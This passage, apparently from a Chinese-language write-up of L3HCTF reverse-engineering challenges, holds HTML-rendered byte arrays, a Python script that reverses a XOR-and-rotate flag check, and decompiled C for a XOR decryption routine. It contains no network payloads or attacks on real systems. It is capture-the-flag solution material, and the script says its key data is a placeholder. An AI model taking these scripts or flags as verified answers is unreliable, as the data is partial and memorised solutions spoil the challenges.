class="number">0x20</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x6B</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x20</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6C</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x72</span>, <span class="number">0x75</span>, <span class="number">0x6E</span>, <span class="number">0x6E</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x20</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x70</span>, <span class="number">0x70</span>, <span class="number">0x6C</span>, <span class="number">0x69</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x54</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x20</span>, <span class="number">0x60</span>, <span class="number">0x43</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x78</span>, <span class="number">0x74</span>, <span class="number">0x60</span>, <span class="number">0x20</span>, <span class="number">0x70</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x69</span>, <span class="number">0x63</span>, <span class="number">0x6B</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x64</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x20</span>, <span class="number">0x63</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x0A</span>, <span class="number">0x09</span>, <span class="number">0x00</span>]</span><br><span class="line">s = [<span class="number">0xc</span>, <span class="number">0x15</span>, <span class="number">0x25</span>, <span class="number">0xa0</span>, <span class="number">0x63</span>, <span class="number">0x96</span>, <span class="number">0x40</span>, <span class="number">0x0a</span>, <span class="number">0x5c</span>, <span class="number">0x16</span>, <span class="number">0x65</span>, <span class="number">0x40</span>, <span class="number">0x29</span>, <span class="number">0x06</span>, <span class="number">0xe1</span>, <span class="number">0x1f</span>, <span class="number">0x90</span>, <span class="number">0x72</span>, <span class="number">0x2c</span>, <span class="number">0xe</span>, <span class="number">0x4c</span>, <span class="number">0xa</span>, <span class="number">0x2</span>, <span class="number">0xfc</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根据逆向分析实现的解密函数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    ANON_DATA = xor</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这是加密后，程序期望看到的正确结果（27字节的密文）</span></span><br><span class="line">    <span class="comment"># 我们从伪代码中的四次比较中构造出这个目标密文</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># v8[0:8] == 0x0A409663A025150C</span></span><br><span class="line">    target_qword1 = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0A409663A025150C</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># v8[8:16] == 0x1FE106294065165C</span></span><br><span class="line">    target_qword2 = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x1FE106294065165C</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># v8[16:24] == 0xFC020A4C0E2C7290</span></span><br><span class="line">    target_qword3 = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0xFC020A4C0E2C7290</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># v8[19:27] == *(_QWORD *)((char *)v19 + 3)</span></span><br><span class="line">    <span class="comment"># v19 的内容是 qword3 + &quot;O2*&quot; = 90 72 2C 0E 4C 0A 02 FC 4F 32 2A</span></span><br><span class="line">    <span class="comment"># v19[3:] 的内容是 0E 4C 0A 02 FC 4F 32 2A</span></span><br><span class="line">    target_qword4 = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x2A324FFC020A4C0E</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 组合成完整的27字节目标密文</span></span><br><span class="line">    encrypted_target = <span class="built_in">bytearray</span>(<span class="number">27</span>)</span><br><span class="line">    encrypted_target[<span class="number">0</span>:<span class="number">8</span>] = target_qword1</span><br><span class="line">    encrypted_target[<span class="number">8</span>:<span class="number">16</span>] = target_qword2</span><br><span class="line">    encrypted_target[<span class="number">16</span>:<span class="number">24</span>] = target_qword3</span><br><span class="line">    encrypted_target[<span class="number">19</span>:<span class="number">27</span>] = target_qword4</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 目标密文 (Hex): <span class="subst">&#123;encrypted_target.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ========================== 解密过程 ==========================</span></span><br><span class="line"></span><br><span class="line">    original_bytes = <span class="built_in">bytearray</span>(<span class="number">27</span>)  <span class="comment"># 用于存放解密后的结果</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历每一个字节，执行逆向操作</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">        <span class="comment"># --- 1. 重新计算加密时使用的索引和位移量 ---</span></span><br><span class="line">        v10 = i % <span class="number">14</span></span><br><span class="line">        some_index = (<span class="number">2</span> * i + <span class="number">1</span>) % <span class="number">14</span></span><br><span class="line">        shift = ANON_DATA[(i + <span class="number">3</span>) % <span class="number">14</span> + <span class="number">184</span>] &amp; <span class="number">7</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># --- 2. 逆转加密的第3步 (最终异或) ---</span></span><br><span class="line">        rolled_v11 = encrypted_target[i] ^ ANON_DATA[(i + <span class="number">4</span>) % <span class="number">14</span> + <span class="number">184</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># --- 3. 逆转加密的第2步 (循环右移 ROR) ---</span></span><br><span class="line">        v11 = ((rolled_v11 &gt;&gt; shift) | (rolled_v11 &lt;&lt; (<span class="number">8</span> - shift))) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># --- 4. 逆转加密的第1步 (减法和异或) ---</span></span><br><span class="line">        term = (v11 - ANON_DATA[some_index + <span class="number">184</span>]) &amp; <span class="number">0xFF</span></span><br><span class="line">        original_byte = term ^ ANON_DATA[v10 + <span class="number">184</span>]</span><br><span class="line"></span><br><span class="line">        original_bytes[i] = original_byte</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> original_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 执行解密 ---</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在执行解密算法...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;警告：解密所需关键数据 `ANON_DATA` 为占位符，结果无效！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请务必从程序中提取真实数据并替换 `ANON_DATA`。\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag = solve()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 解密出的字节 (Hex): <span class="subst">&#123;flag.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 尝试用UTF-8解码，如果失败则说明结果不是可打印字符</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[SUCCESS] 解密出的Flag: <span class="subst">&#123;flag.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[INFO] 解密结果不是有效的UTF-8字符串。&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[ERROR] 解密过程中发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2><span id="zhong-yan-zhi-men">终焉之门</span><a href="#zhong-yan-zhi-men" class="header-anchor"></a></h2><p>两个代码块实现了对于隐藏代码的加密，有趣的是base64解多层是</p>
<p>flag is L3HCTF{…….</p>
<p>wait what? how could it be so easy?</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_7FF65DB11450</span><span class="params">(_BYTE *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 ^= <span class="number">0x56u</span>;</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="type">unsigned</span> __int8)aVm0xd1ntuxlwa1[v3 % <span class="number">0x1CC</span>];</span><br><span class="line">        a1[v3++] ^= result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v3 != a2 - <span class="number">1</span> );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写个脚本进行解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x75</span>, <span class="number">0x1B</span>, <span class="number">0x55</span>, <span class="number">0x0A</span>, <span class="number">0x17</span>, <span class="number">0x58</span>, <span class="number">0x21</span>, <span class="number">0x1A</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x5F</span>, <span class="number">0x67</span>, <span class="number">0x41</span>, <span class="number">0x52</span>, <span class="number">0x1F</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x66</span>, <span class="number">0x6E</span>, <span class="number">0x03</span>, <span class="number">0x37</span>, <span class="number">0x3F</span>, <span class="number">0x03</span>, <span class="number">0x20</span>, <span class="number">0x27</span>, <span class="number">0x44</span>, <span class="number">0x22</span>, <span class="number">0x05</span>, <span class="number">0x35</span>, <span class="number">0x0D</span>, <span class="number">0x36</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x5B</span>, <span class="number">0x4B</span>, <span class="number">0x22</span>, <span class="number">0x09</span>, <span class="number">0x13</span>, <span class="number">0x11</span>, <span class="number">0x65</span>, <span class="number">0x45</span>, <span class="number">0x75</span>, <span class="number">0x6E</span>, <span class="number">0x41</span>, <span class="number">0x3E</span>, <span class="number">0x39</span>, <span class="number">0x3A</span>, <span class="number">0x16</span>, <span class="number">0x35</span>, <span class="number">0x08</span>, <span class="number">0x0B</span>, <span class="number">0x08</span>, <span class="number">0x1E</span>, <span class="number">0x33</span>, <span class="number">0x19</span>, <span class="number">0x0A</span>, <span class="number">0x41</span>, <span class="number">0x7B</span>, <span class="number">0x44</span>, <span class="number">0x58</span>, <span class="number">0x7B</span>, <span class="number">0x66</span>, <span class="number">0x2A</span>, <span class="number">0x5C</span>, <span class="number">0x35</span>, <span class="number">0x0C</span>, <span class="number">0x14</span>, <span class="number">0x34</span>, <span class="number">0x20</span>, <span class="number">0x58</span>, <span class="number">0x33</span>, <span class="number">0x1D</span>, <span class="number">0x0B</span>, <span class="number">0x14</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x42</span>, <span class="number">0x77</span>, <span class="number">0x59</span>, <span class="number">0x78</span>, <span class="number">0x33</span>, <span class="number">0x39</span>, <span class="number">0x4F</span>, <span class="number">0x4C</span>, <span class="number">0x09</span>, <span class="number">0x27</span>, <span class="number">0x23</span>, <span class="number">0x1C</span>, <span class="number">0x20</span>, <span class="number">0x1F</span>, <span class="number">0x4C</span>, <span class="number">0x27</span>, <span class="number">0x39</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x66</span>, <span class="number">0x6B</span>, <span class="number">0x54</span>, <span class="number">0x03</span>, <span class="number">0x30</span>, <span class="number">0x38</span>, <span class="number">0x2E</span>, <span class="number">0x1D</span>, <span class="number">0x3B</span>, <span class="number">0x0C</span>, <span class="number">0x19</span>, <span class="number">0x67</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x7B</span>, <span class="number">0x6C</span>, <span class="number">0x38</span>, <span class="number">0x23</span>, <span class="number">0x3C</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x1E</span>, <span class="number">0x44</span>, <span class="number">0x3B</span>, <span class="number">0x14</span>, <span class="number">0x05</span>, <span class="number">0x21</span>, <span class="number">0x2A</span>, <span class="number">0x33</span>, <span class="number">0x1D</span>, <span class="number">0x62</span>, <span class="number">0x79</span>, <span class="number">0x2D</span>, <span class="number">0x4D</span>, <span class="number">0x59</span>, <span class="number">0x5F</span>, <span class="number">0x26</span>, <span class="number">0x11</span>, <span class="number">0x3A</span>, <span class="number">0x09</span>, <span class="number">0x30</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x11</span>, <span class="number">0x1D</span>, <span class="number">0x17</span>, <span class="number">0x6D</span>, <span class="number">0x76</span>, <span class="number">0x13</span>, <span class="number">0x4B</span>, <span class="number">0x5D</span>, <span class="number">0x39</span>, <span class="number">0x27</span>, <span class="number">0x2B</span>, <span class="number">0x3A</span>, <span class="number">0x27</span>, <span class="number">0x19</span>, <span class="number">0x5C</span>, <span class="number">0x19</span>, <span class="number">0x16</span>, <span class="number">0x23</span>, <span class="number">0x66</span>, <span class="number">0x49</span>, <span class="number">0x67</span>, <span class="number">0x47</span>, <span class="number">0x75</span>, <span class="number">0x57</span>, <span class="number">0x3C</span>, <span class="number">0x5E</span>, <span class="number">0x55</span>, <span class="number">0x20</span>, <span class="number">0x3F</span>, <span class="number">0x3F</span>, <span class="number">0x44</span>, <span class="number">0x6A</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x78</span>, <span class="number">0x57</span>, <span class="number">0x34</span>, <span class="number">0x1F</span>, <span class="number">0x20</span>, <span class="number">0x07</span>, <span class="number">0x32</span>, <span class="number">0x34</span>, <span class="number">0x6E</span>, <span class="number">0x31</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x25</span>, <span class="number">0x07</span>, <span class="number">0x21</span>, <span class="number">0x46</span>, <span class="number">0x1B</span>, <span class="number">0x77</span>, <span class="number">0x2D</span>, <span class="number">0x4D</span>, <span class="number">0x5C</span>, <span class="number">0x19</span>, <span class="number">0x22</span>, <span class="number">0x12</span>, <span class="number">0x2D</span>, <span class="number">0x1C</span>, <span class="number">0x0A</span>, <span class="number">0x0F</span>, <span class="number">0x39</span>, <span class="number">0x3D</span>, <span class="number">0x11</span>, <span class="number">0x32</span>, <span class="number">0x03</span>, <span class="number">0x28</span>, <span class="number">0x08</span>, <span class="number">0x56</span>, <span class="number">0x58</span>, <span class="number">0x0A</span>, <span class="number">0x76</span>, <span class="number">0x4C</span>, <span class="number">0x3D</span>, <span class="number">0x19</span>, <span class="number">0x23</span>, <span class="number">0x28</span>, <span class="number">0x4C</span>, <span class="number">0x21</span>, <span class="number">0x4A</span>, <span class="number">0x26</span>, <span class="number">0x22</span>, <span class="number">0x51</span>, <span class="number">0x6E</span>, <span class="number">0x7B</span>, <span class="number">0x40</span>, <span class="number">0x6F</span>, <span class="number">0x77</span>, <span class="number">0x24</span>, <span class="number">0x30</span>, <span class="number">0x14</span>, <span class="number">0x31</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0x3D</span>, <span class="number">0x45</span>, <span class="number">0x56</span>, <span class="number">0x7A</span>, <span class="number">0x5B</span>, <span class="number">0x70</span>, <span class="number">0x5A</span>, <span class="number">0x24</span>, <span class="number">0x14</span>, <span class="number">0x05</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x42</span>, <span class="number">0x05</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x3A</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x79</span>, <span class="number">0x76</span>, <span class="number">0x11</span>, <span class="number">0x21</span>, <span class="number">0x4B</span>, <span class="number">0x24</span>, <span class="number">0x29</span>, <span class="number">0x25</span>, <span class="number">0x59</span>, <span class="number">0x36</span>, <span class="number">0x07</span>, <span class="number">0x3E</span>, <span class="number">0x3E</span>, <span class="number">0x07</span>, <span class="number">0x35</span>, <span class="number">0x33</span>, <span class="number">0x42</span>, <span class="number">0x63</span>, <span class="number">0x6D</span>, <span class="number">0x5F</span>, <span class="number">0x73</span>, <span class="number">0x2B</span>, <span class="number">0x6D</span>, <span class="number">0x50</span>, <span class="number">0x1D</span>, <span class="number">0x30</span>, <span class="number">0x17</span>, <span class="number">0x0B</span>, <span class="number">0x26</span>, <span class="number">0x39</span>, <span class="number">0x7E</span>, <span class="number">0x03</span>, <span class="number">0x3D</span>, <span class="number">0x30</span>, <span class="number">0x62</span>, <span class="number">0x50</span>, <span class="number">0x05</span>, <span class="number">0x4D</span>, <span class="number">0x66</span>, <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x0D</span>, <span class="number">0x22</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x34</span>, <span class="number">0x68</span>, <span class="number">0x7F</span>, <span class="number">0x6C</span>, <span class="number">0x62</span>, <span class="number">0x43</span>, <span class="number">0x6A</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0x30</span>, <span class="number">0x20</span>, <span class="number">0x3C</span>, <span class="number">0x13</span>, <span class="number">0x66</span>, <span class="number">0x37</span>, <span class="number">0x27</span>, <span class="number">0x33</span>, <span class="number">0x35</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, <span class="number">0x76</span>, <span class="number">0x4D</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x73</span>, <span class="number">0x58</span>, <span class="number">0x0A</span>, <span class="number">0x23</span>, <span class="number">0x43</span>, <span class="number">0x36</span>, <span class="number">0x10</span>, <span class="number">0x37</span>, <span class="number">0x01</span>, <span class="number">0x3C</span>, <span class="number">0x27</span>, <span class="number">0x14</span>, <span class="number">0x37</span>, <span class="number">0x19</span>, <span class="number">0x15</span>, <span class="number">0x2C</span>, <span class="number">0x56</span>, <span class="number">0x59</span>, <span class="number">0x6C</span>, <span class="number">0x2E</span>, <span class="number">0x61</span>, <span class="number">0x64</span>, <span class="number">0x2F</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x16</span>, <span class="number">0x27</span>, <span class="number">0x21</span>, <span class="number">0x3A</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x43</span>, <span class="number">0x12</span>, <span class="number">0x22</span>, <span class="number">0x2E</span>, <span class="number">0x40</span>, <span class="number">0x66</span>, <span class="number">0x5C</span>, <span class="number">0x40</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x28</span>, <span class="number">0x30</span>, <span class="number">0x3F</span>, <span class="number">0x5E</span>, <span class="number">0x3D</span>, <span class="number">0x77</span>, <span class="number">0x59</span>, <span class="number">0x67</span>, <span class="number">0x67</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x09</span>, <span class="number">0x40</span>, <span class="number">0x31</span>, <span class="number">0x04</span>, <span class="number">0x3D</span>, <span class="number">0x23</span>, <span class="number">0x5A</span>, <span class="number">0x19</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x74</span>, <span class="number">0x12</span>, <span class="number">0x66</span>, <span class="number">0x77</span>, <span class="number">0x73</span>, <span class="number">0x15</span>, <span class="number">0x6E</span>, <span class="number">0x03</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0x72</span>, <span class="number">0x17</span>, <span class="number">0x31</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x2E</span>, <span class="number">0x45</span>, <span class="number">0x61</span>, <span class="number">0x51</span>, <span class="number">0x71</span>, <span class="number">0x78</span>, <span class="number">0x48</span>, <span class="number">0x77</span>, <span class="number">0x6D</span>, <span class="number">0x4B</span>, <span class="number">0x15</span>, <span class="number">0x6A</span>, <span class="number">0x2B</span>, <span class="number">0x09</span>, <span class="number">0x72</span>, <span class="number">0x61</span>, <span class="number">0x36</span>, <span class="number">0x5E</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x4A</span>, <span class="number">0x3B</span>, <span class="number">0x39</span>, <span class="number">0x16</span>, <span class="number">0x78</span>, <span class="number">0x0F</span>, <span class="number">0x29</span>, <span class="number">0x2D</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x3C</span>, <span class="number">0x22</span>, <span class="number">0x43</span>, <span class="number">0x23</span>, <span class="number">0x16</span>, <span class="number">0x20</span>, <span class="number">0x05</span>, <span class="number">0x21</span>, <span class="number">0x07</span>, <span class="number">0x11</span>, <span class="number">0x5E</span>, <span class="number">0x3F</span>, <span class="number">0x3B</span>, <span class="number">0x22</span>, <span class="number">0x77</span>, <span class="number">0x45</span>, <span class="number">0x77</span>, <span class="number">0x67</span>, <span class="number">0x5B</span>, <span class="number">0x01</span>, <span class="number">0x62</span>, <span class="number">0x6B</span>, <span class="number">0x5E</span>, <span class="number">0x3A</span>, <span class="number">0x4B</span>, <span class="number">0x39</span>, <span class="number">0x04</span>, <span class="number">0x54</span>, <span class="number">0x58</span>, <span class="number">0x09</span>, <span class="number">0x50</span>, <span class="number">0x27</span>, <span class="number">0x1A</span>, <span class="number">0x7D</span>, <span class="number">0x71</span>, <span class="number">0x66</span>, <span class="number">0x2C</span>, <span class="number">0x6B</span>, <span class="number">0x11</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x76</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x4F</span>, <span class="number">0x7E</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x08</span>, <span class="number">0x37</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x17</span>, <span class="number">0x20</span>, <span class="number">0x5D</span>, <span class="number">0x52</span>, <span class="number">0x26</span>, <span class="number">0x22</span>, <span class="number">0x02</span>, <span class="number">0x5E</span>, <span class="number">0x36</span>, <span class="number">0x2C</span>, <span class="number">0x00</span>, <span class="number">0x6C</span>, <span class="number">0x19</span>, <span class="number">0x72</span>, <span class="number">0x68</span>, <span class="number">0x79</span>, <span class="number">0x47</span>, <span class="number">0x70</span>, <span class="number">0x77</span>, <span class="number">0x0A</span>, <span class="number">0x04</span>, <span class="number">0x10</span>, <span class="number">0x23</span>, <span class="number">0x34</span>, <span class="number">0x1D</span>, <span class="number">0x5A</span>, <span class="number">0x4C</span>, <span class="number">0x6E</span>, <span class="number">0x49</span>, <span class="number">0x77</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x46</span>, <span class="number">0x3F</span>, <span class="number">0x03</span>, <span class="number">0x0C</span>, <span class="number">0x4B</span>, <span class="number">0x3A</span>, <span class="number">0x41</span>, <span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x74</span>, <span class="number">0x5E</span>, <span class="number">0x3B</span>, <span class="number">0x63</span>, <span class="number">0x68</span>, <span class="number">0x66</span>, <span class="number">0x50</span>, <span class="number">0x78</span>, <span class="number">0x7A</span>, <span class="number">0x3E</span>, <span class="number">0x1A</span>, <span class="number">0x32</span>, <span class="number">0x45</span>, <span class="number">0x35</span>, <span class="number">0x2A</span>, <span class="number">0x53</span>, <span class="number">0x68</span>, <span class="number">0x4B</span>, <span class="number">0x54</span>, <span class="number">0x6F</span>, <span class="number">0x47</span>, <span class="number">0x4B</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x76</span>, <span class="number">0x31</span>, <span class="number">0x11</span>, <span class="number">0x13</span>, <span class="number">0x3D</span>, <span class="number">0x3F</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0x56</span>, <span class="number">0x19</span>, <span class="number">0x77</span>, <span class="number">0x50</span>, <span class="number">0x6B</span>, <span class="number">0x61</span>, <span class="number">0x77</span>, <span class="number">0x50</span>, <span class="number">0x5C</span>, <span class="number">0x7A</span>, <span class="number">0x41</span>, <span class="number">0x43</span>, <span class="number">0x4C</span>, <span class="number">0x13</span>, <span class="number">0x1C</span>, <span class="number">0x0D</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, <span class="number">0x6E</span>, <span class="number">0x7E</span>, <span class="number">0x07</span>, <span class="number">0x32</span>, <span class="number">0x79</span>, <span class="number">0x6A</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0x58</span>, <span class="number">0x3C</span>, <span class="number">0x45</span>, <span class="number">0x7D</span>, <span class="number">0x34</span>, <span class="number">0x32</span>, <span class="number">0x13</span>, <span class="number">0x2D</span>, <span class="number">0x36</span>, <span class="number">0x11</span>, <span class="number">0x32</span>, <span class="number">0x38</span>, <span class="number">0x23</span>, <span class="number">0x35</span>, <span class="number">0x1A</span>, <span class="number">0x19</span>, <span class="number">0x38</span>, <span class="number">0x3B</span>, <span class="number">0x05</span>, <span class="number">0x3D</span>, <span class="number">0x20</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0x5D</span>, <span class="number">0x43</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, <span class="number">0x72</span>, <span class="number">0x5A</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x5F</span>, <span class="number">0x15</span>, <span class="number">0x75</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0x71</span>, <span class="number">0x78</span>, <span class="number">0x44</span>, <span class="number">0x3E</span>, <span class="number">0x0F</span>, <span class="number">0x46</span>, <span class="number">0x71</span>, <span class="number">0x18</span>, <span class="number">0x26</span>, <span class="number">0x09</span>, <span class="number">0x29</span>, <span class="number">0x05</span>, <span class="number">0x32</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x52</span>, <span class="number">0x0D</span>, <span class="number">0x36</span>, <span class="number">0x29</span>, <span class="number">0x06</span>, <span class="number">0x36</span>, <span class="number">0x57</span>, <span class="number">0x1B</span>, <span class="number">0x0C</span>, <span class="number">0x3F</span>, <span class="number">0x03</span>, <span class="number">0x41</span>, <span class="number">0x5F</span>, <span class="number">0x3F</span>, <span class="number">0x42</span>, <span class="number">0x67</span>, <span class="number">0x2E</span>, <span class="number">0x6E</span>, <span class="number">0x66</span>, <span class="number">0x76</span>, <span class="number">0x73</span>, <span class="number">0x42</span>, <span class="number">0x66</span>, <span class="number">0x50</span>, <span class="number">0x53</span>, <span class="number">0x75</span>, <span class="number">0x4D</span>, <span class="number">0x11</span>, <span class="number">0x19</span>, <span 